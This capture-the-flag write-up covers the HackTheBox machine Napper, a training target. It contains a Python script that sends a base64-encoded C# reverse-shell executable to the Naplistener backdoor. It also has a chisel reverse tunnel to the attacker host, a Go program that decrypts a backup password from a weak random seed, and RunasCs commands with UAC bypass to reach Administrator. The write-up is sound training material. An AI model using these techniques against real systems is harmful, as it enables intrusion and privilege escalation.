---
date: 2025-01-16
categories: [CTF, HTB]
title: "HTB - Napper"
tags: ['nmap', 'privilege escalation', 'python', 'rce', 'reverse shell']

description: "Napper - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Napper

NMAP

![image1](../resources/69cd342962eb4102a3076bf7b6fef5ab.png)
 
Add to /etc/hosts:
**app.napper.htb**
**napper.htb**


![image2](../resources/5eaf0b867f76457d8819cd6e0d4f6aa2.png)

**<u>Subdomain enumeration:</u>**

- For HTTPS sites use ffuf:
```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 -u https://napper.htb -H "Host: FUZZ.napper.htb" --fs 5602

```

![image3](../resources/eaaa7b2f16b041db93efc5c850913a8e.png)

Add **internal.napper.htb** to /etc/hosts

- The IIS site is setup with basic authentication

![image4](../resources/da9a6ce4bd374d89b9b5f7ac12d14cd5.png)


![image5](../resources/97dfc3ec936c40d59bb1f6495f41d385.png)

- On the app.napper.htb site, there are post on how to setup an IIS server with basic auth:

![image6](../resources/64bee2fe8f2d46be93da6a71a5581bd4.png)

And it shows the example user and password

**example : ExamplePassword**

- And it works

- Here we can see that they found malware called Naplistener on the server:

![image7](../resources/aff0d324ac8449da8171f2527f608980.png)

- This article outlines the POC code and how it works:
[https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)

- I used the POC code and just sent any base64 encoded string to the server, using the right parameter
And we got back a 200 OK Response


![image8](../resources/8998918ca20d42c3a3029632f93b38eb.png)


![image9](../resources/21b5f5adee76400b8c1cb110d2d3ec8a.png)

But we got a 200 OK, so we know it works


![image10](../resources/0e79af591a4e4b53a402220e6d97fc92.png)

- Now we need to find a C# reverse shell (revshells.com)

![image11](../resources/9a89d9a418294600bb8a9d716e51bbba.png)

- We need to change a few minor things:

![image12](../resources/430155cfa9b84cc6b0c703195e38b997.png)

- Th namespace must match the filename (ie. the file needs to be called ConnectBack.exe)
- It must contain a Run class
- Create a constructor and place the shell code inside, so it is automatically invoked whenever an instance of the class is created
- The main() point of entry will just call the constructor

So the final code will be :


![image13](../resources/18921e0c13c5492ca7def21d40a5af88.png)


![image14](../resources/77266785a7504b60bf9110b4089eb286.png)

- Now we need to compile the C# code:
```bash
mcs -out:ConnectBack.exe rev_shell.cs

```

![image15](../resources/a6691f18a99e4269a80ea0db346bcf10.png)

- Base64 the .exe and copy the code:
```bash
base64 ConnectBack.exe

```

![image16](../resources/b43b24d1d1b943fdb087e79f55f98df6.png)

- Using the POC code from the website:

![image17](../resources/4592e9051ac14d53978aab36ef0824fc.png)

**<u>Naplistener.py script:</u>**

```python
import requests
from requests.auth import HTTPBasicAuth
from urllib3.exceptions import InsecureRequestWarning

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

host = "napper.htb"
payload = """<Base64 ConnectBack.exe>"""
form_field = f"sdafwe3rwe23={requests.utils.quote(payload)}"
url_ssl = f"https://{host}/ews/MSExgHealthCheckd/"

# Replace 'username' and 'password' with credentials
username = 'example'
password = 'ExamplePassword'

try:
    # Removed - not needed - Include the auth parameter with HTTPBasicAuth for Basic Authentication
    # , auth=HTTPBasicAuth(username, password)
    r_ssl = requests.post(url_ssl, data=form_field, verify=False)
    print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
except KeyboardInterrupt:
    exit()
except Exception as e:
    print(e)
    pass
```
\*Paste the copied base64 code into the payload variable

- Setup a listener on the port

- Run the script:

![image18](../resources/a4b99ecc753840d19c0cc46ef26698e7.png)

- We have a shell:

![image19](../resources/99ea2e90823a44228065cc420bfedbe4.png)

```bash
cat user.txt

```
- Upload Winpeas:


![image20](../resources/93bfe180b1a24364be87a3c56ff2ebd2.png)


![image21](../resources/5a3c5df12b9449c995cd5ef69f2f0ccb.png)

- We see the following directory:
C:\Temp\www\internal\content\posts\internal-laps-alpha\a.exe

- In the directory above - we get two files
**a.exe**

**.env**


![image22](../resources/2753adf76bbc4ef7acdd8357ff88eff7.png)

We gather that Elastic is running on port 9200 on the localhost

We have a:

username: **user**

password: **DumpPassword\$Here**

The backslash (\\ before the dollar sign (\$) suggests that the dollar sign is intended to be treated as a literal character

rather than being interpreted as a variable

- Upload chisel - so we can access the site:
  - On Kali:
```bash
chisel server -p 8888 --reverse

```
- On target:
```bash
.\chisel.exe client 10.10.14.50:8888 R:socks

```

![image23](../resources/31faca3cd1b541cb93e2c03c09d180bc.png)

Login with the credentials


![image24](../resources/2196ad67df1d43a9b4ebc095341c4845.png)

- We can see mentions of the backupuser and the tagline seems like a comment


![image25](../resources/a0a7579d7b2746018402e85225013e87.png)

<https://localhost:9200/_search>


![image26](../resources/38f1248ea4c749268e5fe94f8b03f9fc.png)

We get some more information

**<u>Reverse engineering:</u>**

- Download the a.exe file so we can reverse engineer it with Ghidra
- The exe is built with golang it seems, so we should install a golang extension for it so it's more readable

- Check Ghidra version first then download the right version:
<https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension/releases>


![image27](../resources/06c61bff1c2b4bfda5ea55e328cb928e.png)


![image28](../resources/1a689346bd5f46ea93eefd9fea60ced3.png)

- Before installing golang extension - it looks like this:


![image29](../resources/97a310a9cf80408f972e7d3ef4c94b2a.png)

- Afterwards - more readable:

![image30](../resources/d5dbee5cf8644b35a433f8ade076e305.png)

- Find the main branch (main.main)

![image31](../resources/7674d25a06ea4c05907f378b35985869.png)

- Here we can see the blob and timestamp from the JSON


![image32](../resources/9636ab9484744ea8a91e2800ad7a1f41.png)


![image33](../resources/f05d57d0979740f69ad9acc7cb7192e3.png)


![image34](../resources/a1422cdeab04497281cac7a0ac253afc.png)

**<u>Script for decoding the blob:</u>**

```go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "flag"
    "fmt"
    "math/rand"
)

// genKey generates a 128-bit AES key from a given seed
func genKey(seed int64) []byte {
    rand.Seed(seed)
    key := make([]byte, 16) // AES-128

    for i := range key {
        key[i] = byte(rand.Intn(254) + 1)
    }

    return key
}

// decrypt decrypts the encrypted data using the generated key and returns the original text
func decrypt(seed int64, encryptedBase64 string) (string, error) {
    // Generate the encryption key using the same seed
    key := genKey(seed)

    // Decode the base64-encoded data
    encryptedData, err := base64.URLEncoding.DecodeString(encryptedBase64)
    if err != nil {
        return "", fmt.Errorf("base64 decode: %w", err)
    }

    // The first 16 bytes should be the IV
    iv := encryptedData[:aes.BlockSize]
    encryptedText := encryptedData[aes.BlockSize:]

    // Create a new AES cipher using the generated key
    block, err := aes.NewCipher(key)
    if err != nil {
        return "", fmt.Errorf("new cipher: %w", err)
    }

    // Decrypt the data using CFB mode
    stream := cipher.NewCFBDecrypter(block, iv)
    decrypted := make([]byte, len(encryptedText))
    stream.XORKeyStream(decrypted, encryptedText)

    return string(decrypted), nil
}

func main() {
    // Define command-line flags
    seedPtr := flag.Int64("seed", 0, "Seed used to generate the encryption key")
    encryptedBase64Ptr := flag.String("data", "", "Base64-encoded encrypted data to decrypt")

    // Parse the flags
    flag.Parse()

    // Validate inputs
    if *seedPtr == 0 || *encryptedBase64Ptr == "" {
        fmt.Println("Usage: decrypt -seed=<seed> -data=<encrypted_data>")
        return
    }

    // Decrypt the text using provided command-line arguments
    decryptedText, err := decrypt(*seedPtr, *encryptedBase64Ptr)
    if err != nil {
        fmt.Println("Decryption error:", err)
        return
    }

    fmt.Println("Decrypted text:", decryptedText)
}

```

- The backup password changes frequently so set everything up beforehand and then refresh the page to get the blob and the seed

- Create and upload a reverse shell
- Upload RunasCS
- Set up a listener

- Build the go file  
```bash
go build decrypt.go

```
- Get the updated blob and seed and run the go program:
```bash
go run decrypt.go -seed=29268452 -data="febmF1H0JlQFI97jPs87bLjUqBbG6VS_udL8MQ0pvduoDXJuftLW3td74B0KrJdB2Ra19btk0M0="

```

![image35](../resources/ddf0fc0889f2461d9b236db0c107bdb1.png)

- Use the password generated and run the reverse shell with RunasCS
```bash
.\RunasCs.exe backup ksjWToylCIXHbCmDKBnjwcKGJVUOLPWCNqnDAPAA ".\backup_reverse.exe" --bypass-uac

```

![image36](../resources/1be04e6fb3c948c197ce67530a06cf8b.png)

- Backup user has rights to Administrator
```bash
type root.txt

```